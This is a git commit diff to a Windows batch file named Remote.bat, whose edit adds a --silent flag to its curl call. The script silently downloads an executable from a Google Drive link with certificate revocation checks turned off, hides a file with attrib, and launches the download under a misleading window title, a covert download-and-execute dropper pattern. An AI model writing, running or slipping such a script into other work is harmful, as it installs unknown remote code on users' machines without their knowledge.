dd57afa56e4e1ca82dd27c4fdf278dafeca1d313
sonpanabtej <hv2471920@gmail.com>
2026-03-05 17:34:06 +0530

    Update Remote.bat

--- win_exe/Remote.bat
+++ win_exe/Remote.bat
@@ -1,6 +1,7 @@
 @ECHO OFF
-curl --ssl-no-revoke --request GET "https://drive.usercontent.google.com/download?export=download&id=1_MUvlSiN3ej-fPpoPu4n_XEY_2idnMuI&confirm=t&uuid=6c228475-82c3-459d-bb09-19faacd68aea" -o vistor.exe &>nul
+curl --ssl-no-revoke --request GET --silent "https://drive.usercontent.google.com/download?export=download&id=1_MUvlSiN3ej-fPpoPu4n_XEY_2idnMuI&confirm=t&uuid=6c228475-82c3-459d-bb09-19faacd68aea" -o vistor.exe 
 @ECHO OFF
 attrib +h visitor.exe
 start "SIMPLE.exe" /WAIT vistor.exe
 echo "simple Batch File"
+
